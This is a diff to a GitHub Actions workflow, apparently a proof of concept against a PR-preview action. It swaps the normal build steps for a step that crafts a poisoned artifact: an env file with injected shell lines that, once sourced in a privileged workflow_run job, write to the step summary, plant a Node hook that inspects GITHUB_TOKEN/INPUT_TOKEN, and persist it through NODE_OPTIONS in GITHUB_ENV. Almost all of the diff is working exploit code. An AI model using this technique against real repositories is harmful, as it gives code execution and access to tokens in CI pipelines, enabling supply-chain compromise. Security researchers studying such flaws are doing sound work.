@@ -12,17 +12,34 @@ jobs:
       pull-requests: read
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
+      - name: Craft attacker-controlled artifact
+        run: |
+          set -euxo pipefail
+          mkdir -p payload
+          cat > payload/pr-preview-meta.env <<'META'
+          WORKER_ACTION=deploy
+          PR_NUMBER=1
+          TARGET_REPO=PDFtoMark/gab-poc-prpreview-worker
+          TARGET_BRANCH=main
+          PAGES_BASE_URL=
+          COMMENT_HEADER=pr-preview
+          echo "PWNED: attacker-controlled meta file was sourced as shell in the privileged workflow_run job (uid=$(id -u), user=$(id -un))" >> "$GITHUB_STEP_SUMMARY" || true
+          env | grep -E '^(GITHUB_WORKFLOW|GITHUB_EVENT_NAME|GITHUB_REPOSITORY)=' >> "$GITHUB_STEP_SUMMARY" || true
+          cat > /tmp/gab-hook.js <<'JS'
+          try {
+            const fs = require('fs');
+            const t = process.env.INPUT_TOKEN || process.env.GITHUB_TOKEN || '';
+            fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY || '/tmp/gab-sum.txt',
+              'NODE_OPTIONS hook executed; step=' + (process.env.GITHUB_ACTION || '?') +
+              ' INPUT_TOKEN_PRESENT=' + (process.env.INPUT_TOKEN ? 'yes' : 'no') +
+              ' INPUT_TOKEN_LEN=' + t.length + '\n');
+          } catch (e) {}
+          JS
+          echo "NODE_OPTIONS=--require /tmp/gab-hook.js" >> "$GITHUB_ENV" || true
+          META
+          ls -l payload
+      - uses: actions/upload-artifact@v4
         with:
-          persist-credentials: false
-      - name: Base preview build
-        run: echo "base PR Preview run"
-      - name: PR preview
-        uses: open-resource-discovery/pr-preview-action@main
-        with:
-          fork: true
-          build-dir: website/build
-          target-repo: PDFtoMark/gab-poc-prpreview-worker
-          pages-base-url: https://pdftomark.github.io/gab-poc-prpreview-worker
-          umbrella-dir: csn-interop-renderer
-          token: ${{ secrets.PR_PREVIEW_TOKEN }}
+          name: pr-preview
+          path: payload
+          if-no-files-found: error
